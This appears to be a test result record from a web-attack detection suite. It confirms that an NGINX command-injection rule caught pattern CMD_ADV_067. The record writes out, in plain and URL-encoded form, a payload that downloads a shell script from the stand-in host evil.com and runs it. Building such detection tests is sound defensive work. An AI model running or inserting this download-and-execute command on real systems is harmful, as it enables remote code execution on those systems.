name: test_e2e_with_logs[230_CMD_ADV_067]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_067` |
| **Name** | Wget Remote Script |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `wget http://evil.com/shell.sh -O /tmp/s && sh /tmp/s`
- **Encoded**: `wget%20http%3A%2F%2Fevil.com%2Fshell.sh%20-O%20%2Ftmp%2Fs%20%26%26%20sh%20%2Ftmp%2Fs`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 11:35:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ADV_067-1769859312522-52w5lx pattern_id=CMD_ADV_067 uri=/?q=wget%20http%3A%2F%2Fevil.com%2Fshell.sh%20-O%20%2Ftmp%2Fs%20%26%26%20sh%20%2Ftmp%2Fs client=127.0.0.1` |
| **Rule Match** | ✅ Match |
